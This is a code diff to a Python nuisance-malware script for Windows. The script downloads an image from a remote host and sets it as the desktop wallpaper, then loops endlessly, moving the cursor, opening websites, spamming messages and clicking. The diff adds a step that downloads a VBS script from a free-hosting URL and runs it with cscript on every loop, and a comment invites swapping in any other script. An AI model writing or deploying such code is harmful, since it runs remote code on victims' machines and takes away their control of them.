@@ -1,16 +1,25 @@
 import pyautogui, random, os, threading, webbrowser, ctypes, requests
 
 #Downloading image and saving it locally to directory where the script is
-bgUrl = "https://cdn.discordapp.com/attachments/921827224955535380/925382106727743488/Screenshot_20210330-114329_Discord.jpg" #You can change url but make sure it goes directly to image
-download = requests.get(bgUrl)
+bgUrl = "https://charonmaster.000webhostapp.com/owersite_budist.jpg" #You can change url but make sure it goes directly to image
+bgDownload = requests.get(bgUrl)
 file = open("background.png", "wb")
-file.write(download.content)
+file.write(bgDownload.content)
 file.close()
 path = os.getcwd() + "/background.png"
 ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0) #Using ctypes module to change background that we have downloaded
 
+vbsUrl = "https://charonmaster.000webhostapp.com/test.vbs" #You can change url and add your vbs script, this one just spams msg box with random symbols
+vbsDownload = requests.get(vbsUrl)
+file = open("script.vbs", "wb")#If you change the name of script you have to change it in while true loop on bottom of code!
+file.write(vbsDownload.content)
+file.close()
+
 #Gets users width and height of screen that is used in movecursor function
 width, height = pyautogui.size()
+
+def vbs():
+    os.system("cscript script.vbs")
 
 #Opens website by url that you provide in variable
 def openwebsite():
@@ -40,5 +49,7 @@ while True:
     thread1.start()
     thread2 = threading.Thread(target=openwebsite)
     thread2.start()
+    thread3 = threading.Thread(target=vbs)
+    thread3.start()
     spammsg()
     clicking()
